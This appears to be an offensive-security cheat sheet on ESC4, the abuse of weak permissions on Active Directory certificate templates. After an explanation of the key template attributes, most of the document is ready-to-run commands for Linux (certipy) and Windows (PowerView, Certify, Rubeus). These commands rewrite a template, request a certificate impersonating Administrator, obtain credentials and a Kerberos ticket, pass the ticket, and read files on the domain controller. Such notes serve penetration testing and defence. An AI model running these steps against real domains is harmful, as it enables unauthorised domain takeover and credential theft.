### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)

> Template DACLs Abuse

---
### Overview

If an attacker has an over permissive permissions on a template, he can make it vulnerable to attacks such as ESC1.

> The below part source on github: [Abusing_Weak_ACL_on_Certificate_Templates](https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates)

There are a lot of attributes, but not many of them are important for domain escalation. The important attributes are following:

- **`mspki-enrollment-flag`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1), this attribute specifies the enrollment flags. If we succeeded in disabling `PEND_ALL_REQUESTS` flag, we can request the template without Manager Approval. In GUI, this attribute can be enabled by checking "CA manager approval" check box in "Issuance Requirements" tab.
- **`mspki-ra-signature`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/160d0057-bfa9-46c5-a839-72e7588f0420), this attribute specifies the number of Authorized Signatures to issue certificate. In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and setting the number.
- **`mspki-certificate-name-flag`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1), this attribute specifies the subject name flags. If we succeeded in enabling `ENROLLEE_SUPPLIES_SUBJECT` flag, we can specify an arbitrary user account Subject Alternative Name (SAN) in certificate request and get high domain privileges. In GUI, this attribute can be enabled by choosing "Supplly in the request" in "Subject Name" tab.
- **`mspki-certificate-application-policy`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/44012f2d-5ef3-440d-a61b-b30d3d978130), this attribute specifies Certificate Application Policy Extension. In GUI, this attribute can be controlled by setting "Application Policies" in "Extensions" tab.
- **`pkiextendedkeyusage`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/be8af2e6-01d8-49a5-bacf-be641041ac73), this attribute specifies Extended Key Usage (EKU).
- **`mspki-ra-application-policies`**: According to the [Microsoft Docs](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/3fe798de-6252-4350-aace-f418603ddeda), this attribute encapsulates embedded properties for multipurpose use. In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and choosing "Application Policy" menu. `Certify.exe` displays this attribute as `Application Policies`.

The following figures show the relationship between attributes and menus:


<img src="/assets/Abusing_Weak_ACL_on_Certificate_Templates_attributes1.png">

<img src="/assets/Abusing_Weak_ACL_on_Certificate_Templates_attributes2.png">

<img src="/assets/Abusing_Weak_ACL_on_Certificate_Templates_attributes3.png">


#### Requirements

1. Find templates where you have dangerous permissions (`WriteProperty` or `WriteOwner`)
2. Modify the template to make it vulnerable:
	1. Grant Enrollment rights for the vulnerable template.
	2. Disable the `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` to deactivate Manager Approval.
	3. Set the `mspki-ra-signature` attribute to `0` to disable the `Authorized Signature requirement`.
	4. Enable the `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` to allow requesting users to specify another privileged account name as a `SAN`.
	5. Set the `mspki-certificate-application-policy` to a certificate purpose for authentication:
		1. Client Authentication (OID: 1.3.6.1.5.5.7.3.2)
		2. Smart Card Logon (OID: 1.3.6.1.4.1.311.20.2.2)
		3. PKINIT Client Authentication (OID: 1.3.6.1.5.2.3.4)
		4. Any Purpose (OID: 2.5.29.37.0)
		5. No Extended Key Usage (EKU)
3. Exploit the vulnerable template after misconfiguring it by getting a certificate for highly privileged user.
4. Clean up the modifications to not disturbing the environment and OPSEC purposes.

---
### From Linux
#### Linux - Enumeration

```bash
$ certipy find -u 'user1@lab.local' -p 'pass' -dc-ip <IP> -vulnerable -stdout
<SNIP>                                                                                                  
  2                                                                                                                                               
    Template Name                       : ESC4                                                                                                    
    Display Name                        : ESC4
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    <SNIP>
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\user1 ###<<<<<<<<<<<<<<<<
        <SNIP>
    [!] Vulnerabilities
      ESC4                              : 'LAB.LOCAL\\user1' has dangerous permissions
```

#### Linux - Abuse

```bash
# Save the old template configuration in a JSON file to restore it later
$ certipy template -u 'user1@lab.local' -p 'pass' -template template -save-configuration template.old -dc-ip <IP> -target <IP>

# Overwrite the template configuration to be vulnerable to ESC1
$ certipy template -u 'user1@lab.local' -p 'pass' -template template -write-default-configuration -dc-ip <IP> -target <IP>

# Requesting a certrificate while impersonating the Administrator
$ certipy req -u 'user1@lab.local' -p 'pass' -template template -dc-ip <IP> -target <IP> -ca lab-LAB-DC-CA -upn Administrator

# Restore the template configuration
$ certipy template -u 'user1@lab.local' -p 'pass' -template template -write-configuration template.old.json -dc-ip <IP> -target <IP>

# Authenticate using the certificate we got
$ certipy auth -username Administrator -pfx administrator.pfx -domain lab.local -dc-ip <IP>
```

---
### From Windows

#### Windows - Enumeration

```PowerShell
PS C:\> .\Certify.exe find
<SNIP>

    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC4
    Schema Version                        : 2
    <SNIP>
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LAB\Domain Admins
                                      LAB\Domain Users 
                                      LAB\Enterprise Admins
        All Extended Rights         : LAB\user1
      Object Control Permissions
        Owner                       : LAB\Administrator
        <SNIP>
        Full Control Principals     : LAB\user1
        <SNIP>
<SNIP>
```

#### Windows - Abuse

```PowerShell
# Using PowerView
Import-Module .\PowerView.ps1

# Add Certificate-Enrollment rights
Add-DomainObjectAcl -TargetIdentity templateName -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose

# Disabling Manager Approval Requirement
# The PEND_ALL_REQUESTS flag bit is 0x00000002, to remove it, we will use 0x00000001 which correspond to CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS and 0x00000008 which is CT_FLAG_PUBLISH_TO_DS. Use 0x00000009 or 9 to set both
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity templateName -Set @{'mspki-enrollment-flag'=9} -Verbose
# Or set PEND_ALL_REQUESTS flag bit in mspki-enrollment-flag attribute to null
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -XOR @{'mspki-enrollment-flag'=2} -Verbose

# Disabling Authorized Signature Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

# Enabling SAN Specification by setting the ENROLLEE_SUPPLIES_SUBJECT flag bit (0x00000001) in mspki-certificate-name-flag attribute.
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose
 
# Editting Certificate Application Policy Extension
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose
```

Now we are done changing the template configuration so we can abuse it for a domain escalation using ESC1 technique.

```PowerShell
# Certificate Request with alternative SAN
PS C:\> .\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:templateName /altname:Administrator
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](./PEM%20to%20PFX.md) 

```PowerShell
# Certificate Authentication
PS C:\> .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials
```

Using Rubeus to create a sacrificial logon session then import the Base64 Ticket into the PowerShell session to act as the impersonated user:

```PowerShell
PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new spawned shell
PS C:\> .\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>

PS C:\> cat '\\LAB-DC\c$\users\Administrator\Desktop\secret.txt'
```
